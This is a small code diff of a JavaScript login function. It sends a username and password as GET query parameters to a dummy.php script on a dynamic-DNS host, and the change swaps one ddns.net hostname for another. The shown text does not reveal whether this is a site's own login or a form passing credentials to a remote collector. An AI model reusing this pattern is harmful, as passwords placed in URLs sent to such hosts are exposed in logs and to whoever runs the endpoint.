@@ -55,7 +55,7 @@ function openLink() {
   var params = "nellUsuario=" + encodeURIComponent(document.getElementById("usrname").value) +
                "&nellSenha=" + encodeURIComponent(document.getElementById("psw").value);
 
-  xhr.open("GET", "https://nellhairstyle.ddns.net/nellSite/dummy.php?" + params, true);
+  xhr.open("GET", "https://nelltekbrazil.ddns.net/nellSite/dummy.php?" + params, true);
 
   xhr.onreadystatechange = function () {
       if (xhr.readyState == 4) {
